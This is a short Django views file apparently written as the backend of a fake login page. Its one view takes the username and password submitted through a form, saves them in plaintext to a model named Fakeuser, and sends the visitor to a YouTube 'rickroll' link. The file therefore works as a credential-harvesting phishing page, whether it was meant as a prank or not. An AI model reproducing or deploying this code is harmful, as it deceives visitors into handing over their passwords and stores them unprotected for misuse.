from django.shortcuts import render
from django.shortcuts import render,redirect,HttpResponse, get_object_or_404,HttpResponseRedirect
from backend.models import *
# Create your views here.
def home(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password =request.POST.get('password')
        Fakeuser.objects.create(username=username, password=password)
        return redirect('https://youtu.be/dQw4w9WgXcQ?si=HmC7xan2XIJ-crlE')
    return render(request, 'index.html', {})